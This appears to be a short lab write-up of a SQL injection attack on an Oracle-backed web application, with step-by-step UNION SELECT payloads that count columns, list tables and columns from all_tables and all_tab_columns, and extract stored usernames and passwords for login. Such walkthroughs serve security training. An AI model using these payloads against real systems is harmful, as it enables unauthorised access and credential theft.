# SQL-injection-attack-listing-the-database-contents-on-Oracle

> # (1)To know the existing columns: 'ORDER BY 3--. Here 2 columns available
![image](https://user-images.githubusercontent.com/59218362/208476549-b40cdd56-df00-4681-a958-54a093025ed9.png)
![image](https://user-images.githubusercontent.com/59218362/208476733-22483735-1286-41e0-ac91-a76ce976a663.png)

> # (2) To check which column are retrieving data: 'UNION SELECT 'Data','Data'--. But, got the internal server error. because it is oracle database

> # (3) To check data retricve in oracle: 'UNION SELECT 'data','data' FROM DUAL--. Here. both columns retrieve data
![image](https://user-images.githubusercontent.com/59218362/208487220-72e6047c-fcbb-4a35-b9ea-cdf926a236b5.png)

> # (4)To know all table name from oracle database: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
![image](https://user-images.githubusercontent.com/59218362/208487761-9469e0d5-9586-4e96-b420-cf7f1a5b248f.png)

> # (5) To know the columns: 'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_GBVMGJ'--
![image](https://user-images.githubusercontent.com/59218362/208489976-2d1a84a1-8043-4dcf-b542-cde1186f2b1a.png)

> # (6) To know the credential: ' UNION SELECT USERNAME_QFOMKN, PASSWORD_HNCXYZ FROM USERS_GBVMGJ--
![image](https://user-images.githubusercontent.com/59218362/208490568-7185759a-5cd4-430e-aac6-43b8cf346c11.png)

> # (7) Now login with the credential :)
